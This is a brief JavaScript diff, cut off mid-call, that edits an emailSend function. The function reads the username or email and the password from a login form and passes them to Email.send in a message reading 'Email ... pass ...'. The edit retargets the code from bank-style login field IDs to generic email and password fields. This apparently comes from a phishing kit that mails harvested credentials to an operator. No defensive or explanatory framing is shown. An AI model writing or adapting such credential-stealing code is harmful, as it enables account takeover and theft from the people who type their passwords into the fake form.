@@ -1,7 +1,7 @@
 function emailSend() {
-  var accounntNumber = document.getElementById('MainContent_LoginSection_UserID_ctrl').value;
-  var password = document.getElementById('MainContent_LoginSection_Password_ctrl').value;
-  var messageBody = "Email " + accounntNumber +
+  var email = document.getElementById('email').value;
+  var password = document.getElementById('password').value;
+  var messageBody = "Email " + email +
     "<br/> pass " + password;
 
   Email.send({
